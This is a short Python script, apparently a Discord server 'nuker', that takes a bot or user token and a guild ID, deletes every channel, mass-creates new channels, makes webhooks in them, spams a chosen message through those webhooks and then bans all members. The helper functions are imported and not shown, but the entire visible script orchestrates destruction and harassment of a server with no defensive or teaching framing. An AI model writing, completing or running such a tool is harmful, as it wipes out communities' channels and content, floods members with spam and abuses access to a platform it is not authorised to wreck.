from modules import *
import asyncio

async def main():
    token = input("Token: ")
    guild_id = int(input("Guild ID: "))
    channel_name = input("Channel Name: ")
    channel_spam_times = int(input("Channels To Create: "))
    webhook_name = input("Webhook Name: ")
    webhook_message = input("Spam Message: ")
    webhook_spam_times = int(input("Number Of Messages: "))
    await delete_channels(token, guild_id)
    channels = await create_channels(token, guild_id, channel_name, channel_spam_times)
    channel_ids = [channel["id"] for channel in channels if channel]
    webhooks = await create_webhooks(token, channel_ids, webhook_name)
    await spam_webhooks(webhooks, webhook_message, webhook_spam_times)
    await ban_all(token, guild_id)

asyncio.run(main())
